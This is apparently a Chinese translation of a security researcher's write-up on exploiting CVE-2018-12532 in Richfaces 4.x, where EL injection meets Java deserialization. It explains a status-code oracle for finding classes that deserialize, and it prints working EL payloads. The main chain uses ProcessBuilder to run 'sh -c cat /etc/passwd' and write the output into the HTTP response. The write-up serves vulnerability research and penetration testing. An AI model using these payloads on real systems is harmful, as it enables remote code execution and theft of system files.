@@ -1,0 +1,274 @@
+# 当EL注入遇上Java反序列化
+
+阅读量 **261385**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-09-21 14:30:29
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 tint0，文章来源：tint0.com
+
+原文地址：<https://tint0.com/when-el-injection-meets-java-deserialization/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## 一、前言
+
+我在某次渗透测试中，发现目标使用了Java Server Faces（JSF）以及JBOSS Richfaces
+UI框架。当我使用CVE-2013-2165漏洞攻击目标的Richfaces
+4后（请参考我之前的一篇[文章](https://tint0.com/matesctf-2018-wutfaces-cve-2013-2165/)），我注意到Codewhitesec曾在一篇[文章](https://tint0.com/when-el-injection-meets-java-deserialization/#footnote1)中提到Richfaces库存在一个新的0day漏洞。@mwulftange发表了一篇研究文章，更加深入分析了具体细节，大家（特别是Java安全领域的新手，比如我）可以仔细阅读。当时大多数内容对我而言都不是特别清晰，因此我决定深入分析，复现研究过程并将其转化为可以实际利用的漏洞。
+
+这个漏洞的编号为CVE-2018-12532，涉及到Expression Language（EL，表达式语言）注入漏洞以及Richfaces
+4.x中的Java反序列化漏洞。常见的漏洞会在几次请求后触发，这个漏洞有所不同，需要更多的努力才能实现RCE。本文的目的是根据该漏洞在公开应用上的利用经验，梳理出更为可靠的RCE漏洞利用链条。
+
+简而言之，我想在本文中讨论如何解决漏洞利用过程中的主要障碍：反序列化过程中因为不兼容库所带来的限制。文中还涉及到Java
+EL表达式及其限制条件，也提供了能可靠绕过这些限制条件的攻击载荷。
+
+## 二、背景知识
+
+我推荐大家先看一下其他文章了解漏洞的整体情况。这里概述一下，利用这个漏洞，攻击者可以将任意EL表达式注入Java序列化对象中，而Richfaces会从用户输入数据中直接获取这些数据，没有使用任何保护措施。
+
+Richfaces在安全方面的故事（参考CVE历史纪录）都源自于资源处理程序（handler）对请求的处理方式，具体过程如下所示：
+
+    
+    
+    -> 获取处理过程相关的类，比如从URI中获取X，并且从参数do获取X的序列化状态对象
+    -(1)-> 反序列化状态对象
+    --(2)-> 创建X的一个实例并恢复其状态
+    ---(3)-> 处理X并产生匹配的响应（图像、视频、表格等）
+    
+
+历史上对应的漏洞如下：
+
+  * CVE-2013-2165：任意反序列化问题，源自于阶段（1）
+  * CVE-2015-0279：EL注入到序列化对象问题，源自于阶段（3）
+  * CVE-2018-12532：最新的这个漏洞只是CVE-2015-0279补丁的再次绕过
+  * 本文涉及到的技术位于阶段（2）中
+
+由于CVE-2018-12532只是缓解措施的绕过，因此该漏洞的利用方法与CVE-2015-0279的利用方法大致相同。Takeshi
+Terada发现了CVE-2015-0279漏洞，而该漏洞是本文分析的漏洞的基础。不幸的是，Takeshi
+Terada发给Jboss团队的[漏洞报告](https://issues.jboss.org/browse/RF-13977)（这也是该漏洞的唯一参考资料）中并不涉及可靠的利用方法，也不包含足够多的漏洞信息。
+
+EL注入漏洞存在于org.richfaces.resource.MediaOutputResource#encode中对MethodExpression.invoke()的调用过程。如果回顾前面提到的3个阶段，那么X对应的就是org.richfaces.resource.MediaOutputResource这个类，并且其状态对象就是EL表达式本身。因此从理论上讲，如果我们想利用这个漏洞，就需要将请求端点指向MediaOutputResource，并且构造一个合适的序列化对象，才能到达存在漏洞的代码行。
+
+## 三、面临的障碍
+
+这里有趣的是Richfaces会使用反序列化过程来生成表达式输入，这与常见的流程有所不同，常见流程会以某个字符串作为输入，然后再将其转换为表达式。有人担心这个过程可能会给漏洞利用带来一些阻碍，最开始的那名研究人员曾发表过如下看法：
+
+>
+> 如果没有可以操控的、有效的do状态对象的样本，这个漏洞利用起来可能没有大家想象中的那么容易。这是因为如果我们想创建状态对象，就需要使用兼容的库，否则反序列化过程可能会失败。
+
+研究人员提出反序列化的失败可能归咎于以下两方面原因：
+
+1、目标应用的classpath中不存在对应的类，这意味着某些本地环境中存在的某些类并不存在于目标应用中；
+
+2、如果对应类存在，那么另外一个问题就是不匹配的UID（这里涉及到[Stream Unique
+Identifier](https://docs.oracle.com/javase/6/docs/platform/serialization/spec/class.html#4100)，SUID这个概念）。简而言之，为了反序列化能成功执行，序列化流中的类以及当前classpath中的类必须在代码中使用一样的serialVersionUID变量，必须具备相同的类签名（方法名称、类型、修饰符等），应用可能利用这些信息来计算UID值。大家可参考其他资料了解具体计算过程。
+
+这意味着实际环境利用过程中存在一些阻碍，比如存在漏洞的应用可能使用的是某些非常规的库环境。如果我们之前尝试过攻击JSF
+Myfaces的反序列化过程，那么我们此时面临的障碍可能非常类似于在[ysoserial](https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads)中使用Myfaces1和Myfaces2这两个gadget。这些gadget的作者的确尝试过列出可用的某些EL组合来克服这个难点，但目前从我角度来看这并非是一种可靠的利用方式。
+
+分析过程中我也审查过源代码，因此我想到了一种方法能够克服Richfaces 4的漏洞利用难题，让这种漏洞利用技术的实用化程度大大增强。
+
+## 四、精准定位
+
+我们的目标是提取出构造MediaOutputResource状态所需的准确类，同时获取这些类在目标应用中的版本信息。首先我想到的是使用包含所有可能的库组合的状态对象来无差别投递载荷，再配合上一个简单的EL表达式，然后祈祷我们的EL表达式被执行。这可能需要花费许多精力，并不实用，因为我们需要提前知道相关库的所有可能的组合。即便如此，有时候EL执行中的某个问题或者其他外部因素（比如WAF）可能导致表达式没有返回我们预期的结果，使我们采用的暴力破解方式功亏一篑。
+
+我的解决方案是一次只尝试每一种可能的类，而不是将所有类堆放在一个载荷中。如果我们可以判断当前类是否可以被正确反序列化，那么最终我们能够找到漏洞利用所需的所有正确类。
+
+因此如何才能判断某个类是否可以被应用程序正确反序列化？其实Richfaces中有一个“功能”可以帮我们完成这个任务。
+
+这种方法之所以能行得通，主要有两个因素作为基础。第一个因素在于Java的反序列化过程非常自然，会返回任何类型的对象，并不关心流中的数据是一个单独的java.lang.Integer或者org.apache.el.MethodExpressionImpl对象数组。
+
+第二个因素来自于Richfaces
+4.x序列化过程中的异常处理。第（1）阶段（反序列化过程）所使用的代码如下所示（摘自org.richfaces.resource.ResourceUtils#decodeObjectData）：
+
+    
+    
+    public static Object decodeObjectData(String encodedData) {
+        byte[] objectArray = decodeBytesData(encodedData);
+    
+        try {
+            ObjectInputStream in = new LookAheadObjectInputStream(new ByteArrayInputStream(objectArray));
+            return in.readObject();
+        } catch (StreamCorruptedException e) {
+            RESOURCE_LOGGER.error(Messages.getMessage(Messages.STREAM_CORRUPTED_ERROR), e);
+        } catch (IOException e) {
+            RESOURCE_LOGGER.error(Messages.getMessage(Messages.DESERIALIZE_DATA_INPUT_ERROR), e);
+        } catch (ClassNotFoundException e) {
+            RESOURCE_LOGGER.error(Messages.getMessage(Messages.DATA_CLASS_NOT_FOUND_ERROR), e);
+        }
+    
+        return null;
+    }
+    
+
+如上所示，Richfaces会捕获所有类型的反序列化异常，继续执行流程，如果出现异常则返回null对象，而不会停止执行。此外，Richfaces中存在null状态对象是非常正常的一件事，而在这种情况下，应用会生成一个带有默认值的新对象，并且假设对象没有缓存状态。
+
+此外大家还可以参考如下代码，应用会在下一阶段使用这些代码来还原对象状态（摘抄自org.richfaces.util.Util#restoreResourceState）：
+
+    
+    
+    public static void restoreResourceState(FacesContext context, Object resource, Object state) {
+        if (state == null) {
+            // transient resource hasn't provided any data
+            return;
+        }
+    
+        if (resource instanceof StateHolderResource) {
+            StateHolderResource stateHolderResource = (StateHolderResource) resource;
+    
+            ByteArrayInputStream bais = new ByteArrayInputStream((byte[]) state);
+            DataInputStream dis = new DataInputStream(bais);
+            try {
+                stateHolderResource.readState(context, dis);
+            } catch (IOException e) {
+                throw new FacesException(e.getMessage(), e);
+            } finally {
+                try {
+                    dis.close();
+                } catch (IOException e) {
+                    RESOURCE_LOGGER.debug(e.getMessage(), e);
+                }
+            }
+        } else if (resource instanceof StateHolder) {
+            StateHolder stateHolder = (StateHolder) resource;
+            stateHolder.restoreState(context, state);
+        }
+    }
+    
+
+如果之前的反序列化过程失败，状态对象就会为null，因此函数会立刻返回（如上第2行代码），这使得资源对象会保持默认的字段和值。随后应用会返回一个200成功状态码以及资源数据。
+
+另一方面
+，如果之前的反序列化操作成功完成（并且请求中的资源为StateHolderResource的一个实例，见上述代码第7行，我们可以操控这个实例），那么应用做的第一件事就是将状态对象转换成一个字节数组（如上代码第10行）。如果状态对象不是数组，那么该操作无法成功执行，此时就会抛出一个异常，而Richfaces中没有任何代码能够捕获该异常，这样就会导致应用程序返回500内部错误。
+
+代码中第7行的条件意味着资源对象必须为StateHolderResource的一个实例。因此，我们只需要将我们的请求端点指向一个静态的资源文件即可（比如css文件或者类似skinning.ecss之类的JavaScript文件）。
+
+基于以上分析，为了构造这类暴力枚举所需的请求，我们需要将我们的请求指向一个静态资源对象，嵌入序列化对象的do参数，其中只包含一个单独的类，而这个类就是我们想验证的是否位于应用classpath中的那个类。
+
+  * 如果webapp返回200成功状态码，那么代表反序列化操作已失败，并且应用中不包含该类，或者UUID值不匹配；
+  * 如果webapp返回500错误状态码，那么代表反序列化操作已成功，并且应用的classpath中的确存在该类，UUID值也匹配。
+
+注意这里我们只需要得到状态码，不需要了解详细的错误信息，这样这种方法在实际应用中就非常实用，因为在大多数情况下，我们应该能够轻松区分200代码以及500错误代码。即便目标部署了类似BIG-IP ASM或者ModSecurity之类的WAF并且使用了非常严格的规则，这个攻击逻辑依然试用，能让我们得到所需的结果。
+
+使用如上技术，我们可以逐步绕过各种限制，最终到达EL注入点。经过多次利用尝试后，我收集到了JSF应用中最常使用的一些相关库，其中部分列表如下（名称来自于Maven公共库）：
+
+  * JSF实现：Mojarra/Myfaces（javax.faces-api / jsf-impl + jsf-api / myfaces-impl + myfaces-api）；
+  * EL接口（javax.el-api / tomcat-jasper-el）；
+  * EL实现：Jasper/Jboss （tomcat-jasper-el / jasper-el / jboss-el）
+
+掌握目标应用的环境信息后，我们就可以构造序列化载荷。使用Mojarra JSF的典型应用中的某个对象映射如下所示：
+
+    
+    
+    Ljava.lang.Object[5]
+     [0] = (java.lang.Boolean) false
+     [3] = (javax.faces.component.StateHolderSaver)
+       savedState = (org.apache.el.MethodExpressionImpl)
+         expr = (java.lang.String) "foo.toString"
+         varMapper = (org.apache.el.lang.VariableMapperImpl)
+           vars = (Ljava.util.HashMap)
+            {(java.lang.String)"foo": (java.lang.String)[EL_TO_INJECT]}
+    
+
+## 五、限制条件
+
+在某些边缘案例中，我发现Richface的默认DEFLATE压缩实现代码中并没有为大型载荷分配足够大的缓冲区，可能会缩短载荷。因此当需要制作较长的EL表达式时，我们需要将压缩类型设置为[Deflater.NO_COMPRESSION](https://docs.oracle.com/javase/7/docs/api/java/util/zip/Deflater.html#NO_COMPRESSION)。这样就可以让服务端的解压缩过程按原始格式输出执行结果，不会干扰二进制程序。
+
+我们还需要注意的是如何利用EL表达式达到RCE目标。目前利用EL表达式获取RCE权限最直接的方式就是利用[Java Script
+Engine](https://docs.oracle.com/javase/7/docs/technotes/guides/scripting/programmer_guide/)（Java脚本引擎）。我所发现的利用EL注入漏洞的两个载荷（参考这两篇文章[[1](http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html)]、[[2](https://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html)]）都用到了这个引擎。最常用的引擎是JRE 8中的Nashorn引擎以及JRE
+7（及较低版本JRE）中的Rhino引擎。语法非常简单：先实例化一个ScriptEngineManager，获取引擎然后执行代码，如下所示：
+
+    
+    
+    #{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("...")}
+    
+
+不幸的是，这种方法并非始终行之有效。比如我有一次碰到了某个特殊目标，他们使用了自定义的OpenJDK，并没有正确实现ScriptEngine。此外，即使应用程序的确部署了引擎，但以上表达式有时候仍会失效。注意上面EL表达式中最后一个方法调用的是eval()，而这个方法在ScriptEngine中有6个重载版本。根据下面的条件1，如果Class.getMethods()中的第一个eval方法（非eval(String)）执行失败，那么表达式就无法成功执行。
+
+因此，我决定不去依赖Java的ScriptEngine，而去研发原生JRE环境可以使用的另一个EL载荷。我们的目标是执行shell命令，然后将输出结果传递给响应数据，形成完整的RCE利用链。
+
+通过在本地测试环境中不断试验及调错，我发现EL中存在几条重要的限制条件：
+
+  * [条件1] EL无法重载方法。应用总是会调用Class.getMethods()数组中名字相匹配的第一个方法；
+  * [条件2] Jasper的EL实现中（tomcat-jasper-el，7.0.53到8.0.25版本），我们无法使用Reflection来调用无参数的方法。这主要是因为其内部EL实现中对varargs的处理存在一些烦人的[bug](https://github.com/apache/tomcat/commit/b7ce5679b9e6a073dadbc31e6ecde12ad1e0ede8)（感谢@orange提供的帮助）；
+  * [条件3] 只有Jasper的EL实现支持将参数列表隐式转化为varargs。在其他实现中（比如jboss-el），varargs需要一个数组参数，所以我们必须实现构造一个数组。
+
+为了绕过条件3，我们需要找到一种方法来构造一个数组及其成员，并且不受到条件2的限制。基于这一点，我们可以通过Class<java.util.ArrayList>.newInstance()来构造一个List，然后依次调用.add(E
+e)、.toArray()最终得到我们所需的数组。最终载荷如下所示，我添加了一些注释使代码阅读起来更加清晰。
+
+    
+    
+    // Execute commands through ProcessBuilder(List<String>).start(). Runtime.exec() won't work because Runtime.getRuntime() violates condition 2
+    #{session.setAttribute("a","".getClass().forName("java.util.ArrayList").newInstance())}
+    #{session.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
+    #{session.getAttribute("c").add("sh")}
+    #{session.getAttribute("c").add("-c")}
+    #{session.getAttribute("c").add("cat /etc/passwd")}
+    #{session.getAttribute("a").add(session.getAttribute("c"))}
+    #{session.setAttribute("p","".getClass().forName("java.lang.ProcessBuilder").declaredConstructors[0].newInstance(session.getAttribute("a").toArray()).start())}
+    #{session.getAttribute("a").set(0,session.getAttribute("p").inputStream)}
+    // Read the output buffer through java.util.Scanner#useDelimiter(java.lang.String)
+    #{session.setAttribute("s","".getClass().forName("java.util.Scanner").declaredConstructors[3].newInstance(session.getAttribute("a").toArray()))}
+    #{session.getAttribute("a").set(0,"\A")}
+    #{session.setAttribute("d","".getClass().forName("java.util.Scanner").methods[1].invoke(session.getAttribute("s"),session.getAttribute("a").toArray()).next())}
+    // Write to response through java.io.PrintWriter#write(java.lang.String)
+    #{session.getAttribute("a").set(0,facesContext.externalContext.response.outputStream)}
+    #{session.setAttribute("w","".getClass().forName("java.io.PrintWriter").constructors[6].newInstance(session.getAttribute("a").toArray()))}
+    #{session.getAttribute("a").set(0,session.getAttribute("d"))}
+    #{"".getClass().forName("java.io.PrintWriter").methods[25].invoke(session.getAttribute("w"),session.getAttribute("a").toArray())}
+    #{session.getAttribute("w").flush()}
+    #{session.getAttribute("w").close()}
+    
+
+这里需要对数组中的对象位置做一些微调，我们可以通过EL来手动提取：
+
+    
+    
+    #{facesContext.externalContext.response.setContentType("".getClass().forName("java.util.Scanner").constructors[3].toString())}
+    
+
+## 六、总结
+
+成功利用漏洞后，我总共从几个厂商那获取了大约7,000美元，其中最大的一个厂商我无法透露给大家，此外还包括Nuxeo、LogMeIn以及大家熟知的其他目标。
+
+这里可以透露一些信息，美国境内某些大型金融组织会用到存在漏洞的某个应用，我花了几天的时间才弄清楚应用的逻辑，最终成功利用了漏洞，这种感觉非常棒。然而，我不得不同意不透露这些组织的名称。
+
+当我们在执行安全方面任务时（比如渗透测试、代码审查或者研究等），总有许多新鲜知识需要学习。我希望大家能与我一样享受这个快乐的过程，也能从中学到一些知识。
+
+本文翻译自tint0.com [原文链接](https://tint0.com/when-el-injection-meets-java-deserialization/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **興趣使然的小胃** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/160338](/post/id/160338)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [tint0.com](https://tint0.com/when-el-injection-meets-java-deserialization/)
+
+如若转载,请注明出处： <https://tint0.com/when-el-injection-meets-java-deserialization/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [漏洞分析](/tag/漏洞分析)
+  * [EL注入](/tag/EL注入)
+  * [Java反序列化](/tag/Java反序列化)
+
+ **+1** __2赞
+
+ __收藏
+
+![](https://p3.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
